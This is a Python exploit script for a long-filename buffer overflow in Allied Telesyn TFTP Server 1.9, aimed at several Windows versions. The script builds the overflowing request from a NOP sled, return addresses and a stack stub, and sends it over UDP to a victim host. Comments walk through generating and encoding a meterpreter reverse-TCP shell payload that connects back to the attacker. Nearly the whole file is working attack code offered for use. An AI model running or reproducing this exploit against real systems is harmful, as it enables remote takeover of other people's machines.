#!/usr/bin/python
# Standalone exploit for Allied Telesyn TFTP Server 1.9
# Written by daleksec 07/21/2016
# Special thanks to NetSec.ws for the excellent walk through (see http://netsec.ws/?p=262)

import sys, socket
 
if len(sys.argv)<=2:
 sys.exit('''Usage: python attftp_long_filename.py <IP Address> <Port> <Your IP Address> <OS choice>

 0	Windows NT SP4 English
 1	Windows 2000 SP0 English
 2	Windows 2000 SP1 English
 3	Windows 2000 SP2 English
 4	Windows 2000 SP3 English
 5	Windows 2000 SP4 English
 6	Windows XP SP0/1 English
 7	Windows XP SP2 English
 8	Windows XP SP3 English
 9	Windows Server 2003
 10	Windows Server 2003 SP2
 ''')
 
host	= sys.argv[1]		# Victim's IP
port	= int(sys.argv[2])	# Victim's Port
lhost	= sys.argv[3]		# Attacker's IP
os	= int(sys.argv[4])	# OS Choice
ret	= []			# Define array containing return addresses

# Define return addresses (Source: Metasploit)
ret = ["\xf7\xa6\x2e\x70",
	"\xc3\x62\x03\x75",
	"\x85\x1d\x03\x75",
	"\x1b\x43\x03\x75",
	"\x5a\x1c\xfe\x74",
	"\xce\x1d\x03\x75",
	"\xfb\x7b\xab\x71",
	"\x72\x93\xab\x71",
	"\x53\x93\x42\x7e",
	"\xd3\xfe\x86\x7c",
	"\x1b\xa0\x86\x7c"]

nop	= "\x90" * (25-len(lhost))	# Create a NOP string as to bring NOPs + LHOST up to 25 bytes

# SKIDDIES BEWARE!
# You didn't think it'd be that easy did you?
# The payload must be customized to include your own IP address and listening port, so you'll need to generate it yourself.
# To do so, use the following steps:
# 
# 1.) Enter the following to create a hex file of the amount that needs to be subtracted from the stack pointer (3500):
# perl -e 'print "\x81\xec\xac\x0d\x00\x00"' > stackadj
#
# 2.) Next, use the following command to create a staged meterpreter shell payload:
# msfpayload windows/meterpreter/reverse_nonx_tcp LHOST=[your IP] LPORT=[your port] R > payload
#
# 3.) Then, combine the two files you just created.
# cat stackadj payload > shellcode
#
# 4.) Finally, let's eliminate the bad characters.
# cat shellcode | msfencode -b '\x00' -e x86/shikata_ga_nai -t python
#
# Enter the output as the value of the "payload" variable.

payload	= "" # Payload (bad characters = \x00, stack adjustment = -3500, can't exceed 210 bytes of space)
#<here>
# payload += ""
# payload += ""
# ...

exploit	= "\x00\x02" + nop + payload + ret[os] + "\x83\xc4\x28\xc3\x00netascii\x00" 	# Our exploit so far 

client = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)	# Declare a UDP socket
client.sendto(exploit, (host, port))				# Send the exploit over UDP to the nominated addresses
